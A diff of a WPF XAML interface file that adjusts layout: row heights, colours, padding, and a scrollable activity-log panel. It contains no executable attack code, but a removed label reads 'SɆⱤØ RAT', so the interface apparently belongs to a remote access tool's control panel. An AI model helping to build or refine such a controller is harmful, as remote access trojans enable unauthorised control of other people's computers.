@@ -195,7 +195,7 @@
                 <RowDefinition Height="3"  />
                 <RowDefinition Height="Auto" />
                 <RowDefinition Height="*"  />
-                <RowDefinition Height="52" />
+                <RowDefinition Height="100" />
             </Grid.RowDefinitions>
 
             <!-- ── Background ─────────────────────────────────────────── -->
@@ -2097,7 +2097,7 @@
                         </StackPanel>
                     </TabItem.Header>
                     <Border Margin="8" Padding="4" CornerRadius="8"
-                            Background="#FF0A0A0A" BorderThickness="1">
+                            Background="#FF000000" BorderThickness="1">
                         <Border.BorderBrush>
                             <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                 <GradientStop Color="#283040FF" Offset="0"/>
@@ -2591,7 +2591,7 @@
             <!-- ── Activity panel ────────────────────────────────── -->
             <Border Grid.Row="4" Background="#C0111222"
                     BorderThickness="0,1,0,0"
-                    CornerRadius="0,0,10,10" Padding="16,4">
+                    CornerRadius="0,0,10,10" Padding="16,8">
                 <Border.BorderBrush>
                     <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                         <GradientStop Color="#281E2038" Offset="0"/>
@@ -2605,21 +2605,22 @@
                         <RowDefinition Height="*"/>
                     </Grid.RowDefinitions>
                     <!-- Top row: server info + current action -->
-                    <Grid Grid.Row="0">
+                    <Grid Grid.Row="0" Margin="0,0,0,4">
                         <Grid.ColumnDefinitions>
-                            <ColumnDefinition Width="Auto" />
                             <ColumnDefinition Width="*" />
+                            <ColumnDefinition Width="Auto" />
                         </Grid.ColumnDefinitions>
-                        <TextBlock Grid.Column="0" x:Name="TxtStatusLeft" Text="SɆⱤØ RAT" Foreground="#2E3048"
+                        <TextBlock Grid.Column="0" Text="ACTIVITY LOG" Foreground="#4A5270"
                                    FontSize="10" FontWeight="SemiBold" VerticalAlignment="Center" />
                         <TextBlock Grid.Column="1" x:Name="TxtStatusBar" Text="Ready"
                                    Foreground="#94A3B8" FontSize="10" VerticalAlignment="Center"
                                    HorizontalAlignment="Right" TextTrimming="CharacterEllipsis"/>
                     </Grid>
                     <!-- Bottom row: recent activity feed -->
-                    <Border Grid.Row="1" Margin="0,2,0,0" Background="#08101020" CornerRadius="3" Padding="6,1">
-                        <TextBlock x:Name="TxtActivityFeed" Text="" Foreground="#505878"
-                                   FontSize="9" FontFamily="Consolas" TextTrimming="CharacterEllipsis"/>
+                    <Border Grid.Row="1" Background="#08101020" CornerRadius="3" Padding="2" BorderThickness="1" BorderBrush="#111E2038">
+                        <ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
+                            <StackPanel x:Name="ActivityFeedPanel" Margin="4"/>
+                        </ScrollViewer>
                     </Border>
                 </Grid>
             </Border>
